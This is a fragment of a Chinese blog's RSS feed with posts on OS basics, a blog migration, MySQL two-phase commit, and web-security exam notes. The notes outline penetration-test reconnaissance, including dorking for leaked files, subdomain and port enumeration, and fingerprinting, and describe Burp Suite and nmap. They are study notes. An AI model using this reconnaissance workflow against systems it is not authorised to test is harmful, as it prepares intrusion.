&lt;li>&lt;a class="link" href="https://segmentfault.com/a/1190000040786792?utm_source=sf-similar-article" target="_blank" rel="noopener"
>https://segmentfault.com/a/1190000040786792?utm_source=sf-similar-article&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.nowcoder.com/questionTerminal/5a2d287965824d3ca93921bf89f8654c" target="_blank" rel="noopener"
>https://www.nowcoder.com/questionTerminal/5a2d287965824d3ca93921bf89f8654c&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://blog.csdn.net/hongweigg/article/details/38115675" target="_blank" rel="noopener"
>https://blog.csdn.net/hongweigg/article/details/38115675&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>OS Summary</title><link>https://resyon.netlify.app/p/os-summary/</link><pubDate>Sun, 20 Feb 2022 12:58:28 +0800</pubDate><guid>https://resyon.netlify.app/p/os-summary/</guid><description>&lt;h1 id="操作系统--linux">操作系统 / Linux&lt;/h1>
&lt;h2 id="绪论">绪论&lt;/h2>
&lt;h3 id="什么是操作系统">什么是操作系统&lt;/h3>
&lt;p>操作系统是 &lt;strong>管理计算机软硬件资源的计算机程序&lt;/strong>，同时也是计算机系统的内核与基石&lt;/p>
&lt;h3 id="操作系统的基本功能">操作系统的基本功能&lt;/h3>
&lt;ol>
&lt;li>内存管理&lt;/li>
&lt;/ol>
&lt;p>内存分配，地址映射，内存保护与共享，虚拟内存等&lt;/p>
&lt;ol start="2">
&lt;li>进程管理&lt;/li>
&lt;/ol>
&lt;p>进程控制，同步，通信；死锁处理，处理器掉调度&lt;/p>
&lt;ol start="3">
&lt;li>设备管理&lt;/li>
&lt;/ol>
&lt;p>完成用户的 IO 请求，方便用户使用设备，提高设备利用率。主要包括缓冲管理，设备分配，设备处理，虚拟设备等&lt;/p>
&lt;ol start="4">
&lt;li>文件管理&lt;/li>
&lt;/ol>
&lt;p>文件存储空间，目录的管理，文件读写管理和保护&lt;/p>
&lt;h3 id="操作系统的特点">操作系统的特点&lt;/h3>
&lt;ol>
&lt;li>虚拟：一个物理实体映为多个逻辑对应物，分为空分复用（eg. 虚拟内存），时分复用（分时系统）&lt;/li>
&lt;li>共享：资源可供内存中多个并发执行的进程共同使用&lt;/li>
&lt;li>并发&lt;/li>
&lt;li>异步：独立，不可预知的速度向前推进&lt;/li>
&lt;/ol>
&lt;h2 id="中断">中断&lt;/h2>
&lt;h2 id="进程线程协程">进程，线程，协程&lt;/h2>
&lt;h3 id="进程">进程&lt;/h3>
&lt;p>&lt;strong>进程是资源分配的基本单位&lt;/strong>，用于管理资源（内存，文件，网络等资源）&lt;/p>
&lt;h4 id="进程的特点">进程的特点&lt;/h4>
&lt;p>PCB 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作&lt;/p>
&lt;ol>
&lt;li>动态性（相对程序）&lt;/li>
&lt;li>并发&lt;/li>
&lt;li>独立&lt;/li>
&lt;li>异步&lt;/li>
&lt;/ol>
&lt;h4 id="特殊进程">特殊进程&lt;/h4>
&lt;ol>
&lt;li>
&lt;p>守护进程：运行在后台的一种特殊进程，独立于控制终端并周期性地执行某些任务&lt;/p>
&lt;/li>
&lt;li>
&lt;p>僵尸进程：子进程退出，而父进程未调用 &lt;code>wait/waitpid&lt;/code> 获取子进程的状态信息，则该子进程的 &lt;strong>进程描述符&lt;/strong> 等信息仍保存在系统中，称为僵尸进程&lt;/p>
&lt;/li>
&lt;li>
&lt;p>孤儿进程：父进程退出，仍在运行的子进程称为孤儿进程，将由 &lt;code>init&lt;/code> 进程收养&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="线程">线程&lt;/h3>
&lt;p>&lt;strong>线程是独立调度的基本单位&lt;/strong>，一个进程可以有多个线程，共享进程资源&lt;/p>
&lt;h3 id="超线程">超线程&lt;/h3>
&lt;p>超线程，也叫多线程，是指一种 &lt;strong>处理器特性&lt;/strong>，一个 &lt;code>CPU&lt;/code>可以保持两个线程状态，然后在纳秒级间隔内 &lt;strong>切换&lt;/strong>。
实际上是并行。&lt;/p>
&lt;h2 id="设备">设备&lt;/h2>
&lt;h3 id="io-设备">I/O 设备&lt;/h3>
&lt;p>I/O 设备包括 &lt;strong>设备控制器&lt;/strong> 和 &lt;strong>设备本身&lt;/strong>
&lt;strong>设备控制器&lt;/strong> 的作用是为操作系统提供简单的接口&lt;/p>
&lt;h2 id="杂项">杂项&lt;/h2>
&lt;h3 id="如何修改内核参数">如何修改内核参数&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://www.rootusers.com/use-procsys-and-sysctl-to-modify-and-set-kernel-runtime-parameters/" target="_blank" rel="noopener"
>ref&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>/proc/sys&lt;/code> 下的文件对应内核参数, ( &lt;code>/ -&amp;gt; .&lt;/code>)&lt;/p>
&lt;ol>
&lt;li>重启即恢复默认&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg. modify net.ipv4.icmp_echo_igore_all = 1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="m">1&lt;/span> &amp;gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysctl -w net.ipv4.icmp_echo_ignore_all&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>持久化修改&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg. on RHE7&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># make sure a *.conf existed in /etc/sysctl.d/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># touch /etc/sysctl.d/icmp_ignore.conf&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;net.ipv4.icmp_echo_ignore_all = 1&amp;#34;&lt;/span> &amp;gt; /etc/sysctl.d/icmp-ignore.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ref">ref&lt;/h2>
&lt;ul>
&lt;li>&lt;a class="link" href="https://blog.csdn.net/ewq21qwe/article/details/106578620?spm=1001.2014.3001.5501" target="_blank" rel="noopener"
>https://blog.csdn.net/ewq21qwe/article/details/106578620?spm=1001.2014.3001.5501&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.rootusers.com/use-procsys-and-sysctl-to-modify-and-set-kernel-runtime-parameters/" target="_blank" rel="noopener"
>https://www.rootusers.com/use-procsys-and-sysctl-to-modify-and-set-kernel-runtime-parameters&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/KeKe-Li/data-structures-questions/blob/master/src/chapter06/golang.01.md" target="_blank" rel="noopener"
>https://github.com/KeKe-Li/data-structures-questions/blob/master/src/chapter06/golang.01.md&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>博客迁移</title><link>https://resyon.netlify.app/p/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</link><pubDate>Sat, 19 Feb 2022 18:47:06 +0800</pubDate><guid>https://resyon.netlify.app/p/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</guid><description>&lt;h1 id="博客迁移">博客迁移&lt;/h1>
&lt;p>之前一直使用 &lt;a class="link" href="https://github.com/halo-dev/halo" target="_blank" rel="noopener"
>halo&lt;/a> 管理博客，这个系统没什么毛病，就是 &lt;code>Java&lt;/code> 写的，跑起来实在太占内存了，我的小服务器实在受不了，随便搞点别的，就得把他停下来。还有就是，小服务器不想要了，主要是续费有点贵，平时也用不着。&lt;/p>
&lt;p>&lt;img src="https://resyon.netlify.app/img/halo.png"
loading="lazy"
alt="占内存的 halo"
>&lt;/p>
&lt;p>现在迁移到了 &lt;a class="link" href="https://resyon.github.io" target="_blank" rel="noopener"
>github page&lt;/a>，使用的引擎是 &lt;a class="link" href="https://github.com/gohugo/hugo" target="_blank" rel="noopener"
>hugo&lt;/a>，选了所谓的 &lt;a class="link" href="https://github.com/panr/hugo-theme-terminal" target="_blank" rel="noopener"
>Terminal&lt;/a> 主题，极简极客风，我个人还是比较满意的，虽说自己肯定是算不上极客。&lt;/p>
&lt;p>感兴趣的朋友可以参考 &lt;a class="link" href="https://gohugo.io/hosting-and-deployment/hosting-on-github/" target="_blank" rel="noopener"
>Host on Github&lt;/a> 这篇官方文章，将博客托管至 Github 上。&lt;/p></description></item><item><title>mysql 事务两阶段提交</title><link>https://resyon.netlify.app/p/mysql-%E4%BA%8B%E5%8A%A1%E4%B8%A4%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A4/</link><pubDate>Thu, 16 Dec 2021 16:03:22 +0800</pubDate><guid>https://resyon.netlify.app/p/mysql-%E4%BA%8B%E5%8A%A1%E4%B8%A4%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A4/</guid><description>&lt;h1 id="mysql-事务两阶段提交">Mysql 事务两阶段提交&lt;/h1>
&lt;h2 id="overview">overview&lt;/h2>
&lt;blockquote>
&lt;p>准确的说是使用&lt;code>innodb&lt;/code>引擎的&lt;code>mysql&lt;/code>事务的两阶段提交
&lt;code>redo-log&lt;/code>是&lt;code>innodb&lt;/code>引擎在存储引擎层面实现的&lt;/p>
&lt;/blockquote>
&lt;p>例表&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">create&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">primary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">c&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如下查询&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">update&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">c&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">`=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>有以下过程&lt;/p>
&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/12/image-8897670d04f14a109066df3f7d0943d0.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h2 id="两阶段提交的必要性">两阶段提交的必要性&lt;/h2>
&lt;p>主要是保证&lt;code>redo-log&lt;/code> 和 &lt;code>bin-log&lt;/code>的一致性。这种必要性体现在异常恢复上。
由常识我们知道
&lt;code>redo-log&lt;/code>用于保证事务的&lt;code>原子性&lt;/code>和&lt;code>持久性&lt;/code>，记录的是物理日志，由存储引擎实现
&lt;code>bin-log&lt;/code>用于归档， 记录的逻辑日志，由mysql &lt;code>server&lt;/code> 层实现&lt;/p>
&lt;p>若不保证二者同步更新（不使用两阶段提交，即在二者之一完成之后立即提交事务），将出现以下两种情况&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;code>redo-log&lt;/code> -&amp;gt; &lt;code>commit&lt;/code> -&amp;gt; &lt;code>bin-log&lt;/code>
若在&lt;code>commit&lt;/code>和&lt;code>bin-log&lt;/code>间异常重启，系统能根据&lt;code>redo-log&lt;/code>恢复事务，&lt;code>bin-log&lt;/code>于是实际上少了一条记录，这就影响了后续对&lt;code>bin-log&lt;/code>的使用，如构建从库，恢复到某一检查点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>bin-log&lt;/code> -&amp;gt; &lt;code>commit&lt;/code> -&amp;gt; &lt;code>redo-log&lt;/code>
若在&lt;code>commit&lt;/code>和&lt;code>redo-log&lt;/code>间异常重启，系统无法恢复事务，而&lt;code>bin-log&lt;/code>多了一条记录，而数据库里实际没有，以后用&lt;code>bin-log&lt;/code>也会出现与原库不一样的问题&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>&lt;code>redo-log&lt;/code>和&lt;code>bin-log&lt;/code>都可以用于表示事务的提交状态，而两阶段提交就是让这两个状态保持逻辑上的一致。&lt;/p>
&lt;blockquote>
&lt;p>ref 丁奇《MySQL实战45讲》&lt;/p>
&lt;/blockquote></description></item><item><title>网安选修课的期末考前急救</title><link>https://resyon.netlify.app/p/%E7%BD%91%E5%AE%89%E9%80%89%E4%BF%AE%E8%AF%BE%E7%9A%84%E6%9C%9F%E6%9C%AB%E8%80%83%E5%89%8D%E6%80%A5%E6%95%91/</link><pubDate>Sat, 11 Dec 2021 19:34:37 +0800</pubDate><guid>https://resyon.netlify.app/p/%E7%BD%91%E5%AE%89%E9%80%89%E4%BF%AE%E8%AF%BE%E7%9A%84%E6%9C%9F%E6%9C%AB%E8%80%83%E5%89%8D%E6%80%A5%E6%95%91/</guid><description>&lt;h1 id="web-security-test">web-security test&lt;/h1>
&lt;h2 id="试题手写40">试题手写40&lt;/h2>
&lt;h3 id="整个攻击流程渗透过程">整个攻击流程（渗透过程）&lt;/h3>
&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/12/image-6df3aeb93bde491b839d3a8a05c4a944.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h4 id="渗透-信息的收集">渗透-信息的收集&lt;/h4>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing" target="_blank" rel="noopener"
>PPT&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>收集域名信息&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>whois
查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商）
tools: &lt;code>whois&lt;/code>(kali), &lt;code>爱站工具网&lt;/code>(&lt;a class="link" href="https://whois.aizhan.com" target="_blank" rel="noopener"
>https://whois.aizhan.com&lt;/a>)、&lt;code>站长之家&lt;/code>(&lt;a class="link" href="http://whois.chinaz.com" target="_blank" rel="noopener"
>http://whois.chinaz.com&lt;/a>)和&lt;code>VirusTotal&lt;/code>(&lt;a class="link" href="https://www.virustotal.com" target="_blank" rel="noopener"
>https://www.virustotal.com&lt;/a>)&lt;/li>
&lt;li>备案信息
tools: &lt;code>ICP备案查询网&lt;/code>：http://www.beianbeian.com, &lt;code>天眼查&lt;/code>：http://www.tianyancha.com。&lt;/li>
&lt;/ul>
&lt;ol start="2">
&lt;li>收集敏感信息&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>google 常用语法
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-b041a8198d7c40109ed3f4c5b8613e6a.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>通过&lt;code>Burp Suite&lt;/code>的&lt;code>Repeater&lt;/code>功能，（如运行的Server类型及版本，PHP的版本信息等）&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>收集子域名信息&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>因为子域名通常护甲较弱&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>子域名检测工具
(eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>搜索引擎枚举
&lt;code>site: ${target_domain}&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第三方聚合应用枚举
很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域
名。只需在其搜索栏中输入域名，就可检索到相关的域名信息&lt;/p>
&lt;/li>
&lt;li>
&lt;p>证书透明度公开日志枚举
最简单的方法就是使用搜索引擎搜索一些公开的CT日志&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol start="4">
&lt;li>收集常用端口信息&lt;/li>
&lt;/ol>
&lt;p>关注常见应用的默认端口和在端口上运行的服务，便于渗透
tools: &lt;code>Nmap&lt;/code>，无状态端口扫描工具&lt;code>Masscan&lt;/code>、&lt;code>ZMap&lt;/code>和&lt;code>御剑高速TCP端口扫描工具&lt;/code>&lt;/p>
&lt;ol start="5">
&lt;li>指纹识别
指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别
应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。
CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。&lt;/li>
&lt;/ol>
&lt;p>tools: &lt;code>御剑Web指纹识别&lt;/code>、&lt;code>WhatWeb&lt;/code>、&lt;code>WebRobo&lt;/code>、&lt;code>椰树&lt;/code>、&lt;code>轻量WEB指纹识别&lt;/code>等&lt;/p>
&lt;ol start="6">
&lt;li>寻找真实ip&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>无CDN: tools: &lt;a class="link" href="https://www.ip138.com" target="_blank" rel="noopener"
>www.ip138.com&lt;/a>&lt;/li>
&lt;li>有CDN: &lt;del>我赌他不考&lt;/del>&lt;/li>
&lt;/ul>
&lt;ol start="7">
&lt;li>收集敏感目录&lt;/li>
&lt;li>社会工程学&lt;/li>
&lt;/ol>
&lt;h3 id="owsp十大安全漏洞">OWSP十大安全漏洞&lt;/h3>
&lt;p>OWASP组织：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正.实际.有成本效益的信息。其目的是协助个人.企业和机构来发现和使用可信赖软件。
十个漏洞：&lt;/p>
&lt;ol>
&lt;li>注入&lt;/li>
&lt;li>失效的身份认证和会话管理&lt;/li>
&lt;li>跨站脚本&lt;/li>
&lt;li>不安全的直接对象引用&lt;/li>
&lt;li>安全配置错误&lt;/li>
&lt;li>敏感信息泄露&lt;/li>
&lt;li>功能级访问控制缺失&lt;/li>
&lt;li>跨站请求伪造&lt;/li>
&lt;li>使用含有已知漏洞的组件&lt;/li>
&lt;li>未验证的重定向与 转发&lt;/li>
&lt;/ol>
&lt;h3 id="web-及工作原理">&lt;del>web 及工作原理&lt;/del>&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing" target="_blank" rel="noopener"
>web, php, mysql, etc 网安入门 ppt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/12/image-2b150c9ecbad4114a85cfddc3f5beda4.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-d5537aaf28244053816285b340304493.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-6bbd4f4973a4456788762a8ef25d87e7.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-2293c0d9f06f40bba5b297d709ab033f.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-0418374bc0aa483d9e7d15f1755bef8d.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-8afcc2d81e8c410aa5c2b7a5ae050e06.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h3 id="web框架怎样的结构哪三层作用是什么">web框架怎样的结构，哪三层，作用是什么&lt;/h3>
&lt;blockquote>
&lt;p>&lt;del>下面给的原答案好像有点问题&lt;/del>
说的可能是 &lt;a class="link" href="https://developer.aliyun.com/article/45632" target="_blank" rel="noopener"
>这个&lt;/a>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-ad5b8643660b40b79d406f882cf68405.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;/blockquote>
&lt;p>web应用-&amp;gt;应用服务器-&amp;gt;数据库服务器&lt;/p>
&lt;ul>
&lt;li>web应用：可以通过Web访问的应用程序, eg. WordPress&lt;/li>
&lt;li>应用程序服务器（英语：application server）是一种软件框架，提供一个应用程序运行的环境。 用于为应用程序提供安全.数据.事务支持.负载平衡大型分布式系统管理等服务。eg. Apache, IIS&lt;/li>
&lt;li>数据库服务器：是联系Web服务器与数据库管理系统（DBMS）的中间件是负责处理所有的应用程序服务器，包括在web服务器和后台的应用程序或数据库之间的事务处理和数据访问。eg&amp;hellip;&lt;/li>
&lt;/ul>
&lt;h3 id="三个工具主要功能简单操作要会">三个工具主要功能，简单操作要会&lt;/h3>
&lt;h4 id="burpsuite">burpsuite&lt;/h4>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1Ps-miNR8luOUMqi36Co4uaY9DTZM3BFVsEEwLLN8KKY/edit?usp=sharing" target="_blank" rel="noopener"
>ppt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://zh.wikipedia.org/wiki/Burp_suite" target="_blank" rel="noopener"
>ref&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>用于测试网络应用程序安全性的图形化工具(java)&lt;/p>
&lt;ul>
&lt;li>HTTP Proxy — 拦截、查看、修改所有在客户端与服务端之间传输的数据。(他就是个拦截，指道的，发挥其他功能要靠下面的模块)&lt;/li>
&lt;li>&lt;del>Scanner&lt;/del> — Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。&lt;/li>
&lt;li>Intruder — 对 Web 应用程序执行自动攻击。提供可配置算法，可生成恶意 HTTP 请求。Intruder 工具可以测试和检测 SQL 注入、跨站脚本、参数篡改和易暴力攻击的漏洞。&lt;/li>
&lt;li>&lt;del>Spider&lt;/del> — 自动抓取 Web 应用程序的工具。可以与手工映射技术一起使用，加快映射应用程序内容和功能的过程。&lt;/li>
&lt;li>Repeater — 用来手动测试应用程序的简单工具。用于修改对服务器的请求，重新发送并观察结果。它最大的用途就是能和其他 Burp Suite工具结合起来使用。可以将目标站点地图、 Burp Proxy/浏览记录、 Burp Intruder的攻击结果，发送到 Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。&lt;/li>
&lt;li>&lt;del>Decoder&lt;/del> — 将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。能够利用启发式技术智能识别多种编码格式。&lt;/li>
&lt;li>&lt;del>Comparer&lt;/del> — 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。&lt;/li>
&lt;li>&lt;del>Extender&lt;/del> — 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能&lt;/li>
&lt;li>&lt;del>Sequencer&lt;/del> — 分析数据项样本随机性的工具。可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。&lt;/li>
&lt;/ul>
&lt;h4 id="nmap">nmap&lt;/h4>
&lt;p>Nmap( Network Mapper,网络映射器), &lt;code>网络探测&lt;/code>和&lt;code>安全审核&lt;/code>工具。用来&lt;code>快速扫描大型网络&lt;/code>，包括&lt;code>主机探测与发现&lt;/code>、&lt;code>开放的端口情况&lt;/code>、操作系统与应用服务&lt;code>指纹识别&lt;/code>、WAF识别及常见安全漏洞。&lt;del>它的图形化界面是Zenmap,分布式框架为Dmap。&lt;/del>
特点：&lt;/p>
&lt;ul>
&lt;li>主机探测：探则网络上的主机，如列出响应TCP和CMP请求、ICMP请求、开放特别端口的主机&lt;/li>
&lt;li>端口扫描：探测目标主机所开放的端口&lt;/li>
&lt;li>版本检测：探测目标主机的网络服务，判断其服务名称及版本号&lt;/li>
&lt;li>系统检测：探测目标主机的操作系统及网络设备的硬件特性&lt;/li>
&lt;li>支持探测脚本的编写：使用Nmap的脚本引擎(NSE)和lua编程语言。&lt;/li>
&lt;/ul>
&lt;p>使用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
